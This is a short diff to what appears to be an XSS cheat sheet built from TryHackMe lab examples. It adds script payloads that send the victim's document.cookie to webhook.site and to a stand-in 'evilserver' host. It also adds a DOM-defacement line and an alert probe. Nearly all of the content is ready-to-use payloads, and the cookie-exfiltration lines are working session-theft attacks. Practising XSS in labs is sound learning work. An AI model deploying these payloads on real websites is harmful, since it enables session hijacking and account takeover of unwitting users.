@@ -44,12 +44,17 @@ document.querySelectorAll('#thm-title')[0].innerText
 document.querySelectorAll('#thm-title')[0].innerText = "Insert Code"
 ```
 
-### Testing XSS using webhooks (Thanks to @iiLegacyyii)
+### Testing XSS using webhooks (Thanks to @iiLegacyyii) and also tryhackme examples taken from https://tryhackme.com/room/xss
 
 Generate your webhook session id by using https://webhook.site/
 ```
 <script>document.location = "https://webhook.site/session_id"</script>
 <script>document.location = "https://webhook.site/session_id/?cookies=" + document.cookie</script>
+
+Tryhackme examples
+<script>window.location='http://evilserver/log/sessid='+document.cookie</script>
+<script>document.getElementById("thm-title").innerHTML = "test";</script>
+<script>alert(window.location.hostname)</script>
 ```
 
 ### jQuery 2.1.1
